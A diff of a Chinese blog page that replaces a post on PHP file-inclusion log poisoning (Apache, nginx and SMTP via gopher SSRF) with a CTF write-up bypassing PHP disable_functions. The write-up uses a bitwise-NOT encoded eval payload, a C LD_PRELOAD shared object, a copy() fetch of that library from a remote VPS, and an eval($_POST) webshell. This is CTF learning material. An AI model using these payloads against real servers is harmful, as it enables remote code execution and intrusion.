@@ -6,12 +6,12 @@
   <meta name="author" content="Imtinmin" />
   
   
-  <title>文件包含 | Imtinmin的小站</title>
+  <title>极客大挑战RCE ME | Imtinmin的小站</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="CTF,WEB,CTF,文件包含," />
+    <meta name="keywords" content="WEB,Bypass_disable_function," />
   
 
   
@@ -164,12 +164,8 @@
   <div class="passage">
   <div class="passage-meta">
     <span>
-      <i class="fa fa-calendar"></i>2019-11-07
+      <i class="fa fa-calendar"></i>2019-12-15
     </span>
-    
-      <span>
-        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
-      </span>
     
     
       <span>
@@ -178,73 +174,53 @@
     
   </div>
   <h1 class="passage-title">
-    文件包含
+    极客大挑战RCE ME
   </h1>
   
     <div class="passage-cover">
-      <figure style="background-image:url(https://i.loli.net/2019/11/07/NC3UTQVZjKDxq2u.png);"></figure>
+      <figure style="background-image:url(https://i.loli.net/2019/12/15/LYkWUS7Tj8KuRMG.png);"></figure>
     </div>
   
   <article class="passage-article">
-    <h1 id="apache-日志污染"><a href="#apache-日志污染" class="headerlink" title="apache 日志污染"></a>apache 日志污染</h1><p>需要能读到<code>apache</code>日志</p>
-<p><img src="https://i.loli.net/2019/11/07/x73ImtKQVhfJRSP.png" alt="apache2"></p>
-<p>虽然报400错误，但是会写入<code>access.log</code></p>
-<p><img src="https://i.loli.net/2019/11/07/a8gc3vYq5MOIGWR.png" alt="image.png"></p>
-<p>包含getshell</p>
-<blockquote>
-<p>要用burp，postman不然会被urlencode</p>
-</blockquote>
-<h1 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h1><p>参考链接： </p>
-<blockquote>
-<p><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a></p>
-<p><a href="http://yulige.top/?p=346" target="_blank" rel="noopener">http://yulige.top/?p=346</a> </p>
-</blockquote>
-<p>###　环境搭建</p>
-<p><code>index.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--<span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);--&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ubuntu16.04 需要把/var/log/nginx 目录权限设为645 </p>
-<p>error.log 设为至少644</p>
-</blockquote>
-<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码,nginx 不会对get键编码</p>
-<p><img src="https://i.loli.net/2019/11/07/ZJkcIgFLnveSM68.png" alt=""></p>
-<p>成功写入</p>
-<p><img src="https://i.loli.net/2019/11/07/gD8jtVpoR3CqNAT.png" alt="nginx-include2.png"></p>
-<p>日志文件内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# cat error.log </span><br><span class="line">2019/11/07 07:32:07 [error] 9486#9486: *4 FastCGI sent in stderr: &quot;PHP message: PHP Notice:  Undefined index: a in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Filename cannot be empty in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Failed opening &apos;&apos; for inclusion (include_path=&apos;.:/usr/share/php&apos;) in /var/www/html/index.php on line 2&quot; while reading response header from upstream, client: 112.96.102.200, server: _, request: &quot;GET /?&lt;?php phpinfo();?&gt; HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php/php7.0-fpm.sock:&quot;, host: &quot;39.108.36.103:7777&quot;</span><br></pre></td></tr></table></figure>
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>evoa师傅出的题，学到很多，以前只看过disable_function 的第一次自己操作</p>
+<p>给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">        $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 
 
-<p>自己测试时，想清理日志可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# rm error.log </span><br><span class="line">root@9056889a4768:/var/log/nginx# touch error.log</span><br><span class="line">root@9056889a4768:/var/log/nginx# service nginx restart</span><br></pre></td></tr></table></figure>
+<p>#　LD_PRELOAD&amp;mail</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
 
-<p>不重启日志不会写进去</p>
-<hr>
-<h1 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h1><p> 出自2019年6月安恒杯的一题 </p>
-<blockquote>
-<p>本地ubuntu18.04打不成，不知道为啥</p>
-</blockquote>
-<p>出题人镜像:   </p>
-<blockquote>
-<p> registry.cn-hangzhou.aliyuncs.com/bypass/postfix</p>
-<p> 失效的话用：tinmin/gophersmtp</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/bypass/postfix</span><br></pre></td></tr></table></figure>
+<p>看到disable function</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>
 
-<p>用<code>Gopherus</code>构造payload</p>
-<p><img src="https://i.loli.net/2019/11/07/wpIVrzCTmHbOKhR.png" alt="image.png"></p>
-<p><code>payload</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:25/_MAIL%20FROM:%3Ctinmin%40tinmin.cn%3E%0ARCPT%20To:%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0ADATA%0AFrom:%3Ctinmin%40tinmin.cn%3E%0ASubject:test%0AMessage:test%0A.</span><br></pre></td></tr></table></figure>
+<p>参考</p>
+<p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p>用这段时间比较好用的环境变量 LD_preload + mail劫持so来执行系统命令</p>
+<p>可以直接用</p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD项目" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD项目</a></p>
+<p>也可以自己生成so文件</p>
+<p>tinmin.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>发送&gt;&gt;&gt;&gt;&gt;</p>
-<p><img src="https://i.loli.net/2019/11/07/iOCfUB6IdQZWqMx.png" alt="curl"></p>
-<p>成功！</p>
-<p><img src="https://i.loli.net/2019/11/07/RZymX3OwBnTShEQ.png" alt="success"></p>
-<p>日志被污染成</p>
-<blockquote>
-<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#x40;&#x74;&#105;&#110;&#x6d;&#x69;&#110;&#x2e;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#x40;&#x74;&#105;&#110;&#x6d;&#x69;&#110;&#x2e;&#99;&#x6e;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#x69;&#x6e;&#109;&#x69;&#x6e;&#x40;&#x74;&#x69;&#x6e;&#109;&#105;&#110;&#46;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#x6e;&#109;&#x69;&#x6e;&#x40;&#x74;&#x69;&#x6e;&#109;&#105;&#110;&#46;&#99;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
-</blockquote>
+<p>编译一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC tinmin.c -o tinmin</span><br><span class="line">gcc --share tinmin -o tinmin.so</span><br></pre></td></tr></table></figure>
+
+<p>用copy将文件上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(<span class="string">"http://vps/tinmin.so"</span>,<span class="string">"/tmp/tinmin.so"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一开始<code>?code</code>因为限制长度40,所以用<a href="https://u.nu/" target="_blank" rel="noopener">https://u.nu/</a> 短链接，能够将文件copy到web目录，后来evoa师傅说，可以蚁剑啊，才想起来，构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)($&#123;~%A0%B8%BA%AB&#125;[~%9E])								//$_GET[a]</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>a=eval($_POST[b]);</code>就可以很舒服的执行php语句了，还可以蚁剑</p>
+<p><img src="https://i.loli.net/2019/12/15/SQlqL4viTPbN6Mz.png" alt="image.png"></p>
+<p>蚁剑读一下重定向文件</p>
+<p><img src="https://i.loli.net/2019/12/15/F8IzYD61bcAxHgn.png" alt="image-20191215002848278"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好多细节不知道导致老是执行不成，例如<code>assert</code>只能执行一个函数，所以最后要<code>eval</code></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://evoa.me/index.php/archives/62/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/62/</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
 
   </article>
   <aside class="table-content" id="site-toc">
@@ -253,7 +229,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#apache-日志污染"><span class="toc-text">apache 日志污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nginx-日志污染getshell"><span class="toc-text">nginx 日志污染getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写入"><span class="toc-text">写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMTP-日志投毒getshell-需要配合ssrf"><span class="toc-text">SMTP 日志投毒getshell(需要配合ssrf)</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
   </div>
 </aside>
   
@@ -262,9 +238,7 @@
      
       <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
      
-      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
-     
-      <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa fa-tags"></i>文件包含</a>
+      <a href="/tags/Bypass-disable-function/"><i class="fa fa-tags"></i>Bypass_disable_function</a>
     
     </div>
   
@@ -388,10 +362,10 @@
 
 <div class="bottom-bar">
   <div class="bottom-bar-left">
-    <a href="/2019/11/09/2019-11-9-CTF/" data-enable="true">
+    <a href="javascript:void(0);" data-enable="false">
       <i class="fa fa-arrow-left"></i>
     </a>
-    <a href="/2019/11/05/2019-11-5-CTF/" data-enable="true">
+    <a href="/2019/12/05/2019-12-5-WEB/" data-enable="true">
       <i class="fa fa-arrow-right"></i>
     </a>
   </div>
